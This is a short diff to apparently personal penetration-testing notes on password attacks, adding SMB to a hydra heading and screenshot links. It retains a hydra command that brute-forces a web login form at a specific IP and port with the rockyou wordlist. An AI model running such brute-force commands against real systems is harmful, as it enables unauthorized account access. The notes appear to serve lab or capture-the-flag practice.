@@ -22,8 +22,11 @@ Last route, hard to crack, easy to get blocked.
 ```
 hydra -l admin -P rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
 ```
-## hydra ftp/ssh
+## hydra ftp/ssh/smb
 ![Pasted image 20230509090612](https://github.com/dbissell6/Shadow_Stone/assets/50979196/0be7b78a-b10d-4edf-b1cb-5b28402c216b)
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/e9852315-02b7-485d-b2d5-0408b0aa613a)
+
 
 ## crackmapexec
 
